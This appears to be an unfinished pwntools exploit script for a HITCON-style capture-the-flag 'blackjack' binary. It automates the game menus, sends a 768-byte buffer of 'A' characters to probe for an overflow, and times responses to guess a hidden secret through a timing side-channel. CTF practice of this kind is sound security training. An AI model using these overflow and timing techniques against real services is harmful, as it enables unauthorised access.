from pwn import *
import sys

#'''
#ip = sys.argv[1]
#port = int(sys.argv[2])
#r = remote(ip, port)
r = process('./blackjack')
#'''
context.arch = "amd64"

#r = process('./blackjack')

def get_money():
    r.sendlineafter('Exit', '3')
    r.recvuntil('$')
    return int(r.recvline().strip())

def buy(i):
    r.sendlineafter('Exit', '4')
    r.sendlineafter('Exit', str(i))
    r.sendafter('good:','A'*768)

    r.recvuntil('you are: ')
    print(r.recvline().strip())

'''
while True:
    r.sendlineafter('Exit', '2')
    r.sendlineafter('Give up', '2')
    r.sendlineafter('1 - 3', '3')
    r.sendlineafter('?', '1')
    r.sendlineafter('n', 'n')
    r.sendlineafter('n', 'n')

    r.recvuntil('Hit? (y/n)\n')
    r.sendline('y')
    r.recvline()

    while True:
        if 'Hit' in r.recvn(5):
            r.recvline()
            r.sendline('y')
            r.recvline()
        else:
            break

    money = get_money()
    if money > 999999:
        break
    elif money == 0:
        exit(0);
'''


raw_input("$")

def test(idx):
    tol = []
    for i in range(10):
        r.sendlineafter('Exit', '1337')

        start_time = time.time()

        r.sendlineafter('Secret?', 'HITCON'[:idx].ljust(32))

        tol.append(time.time() - start_time)
    tol.sort()
    print(tol[5])

test(6)
r.interactive()

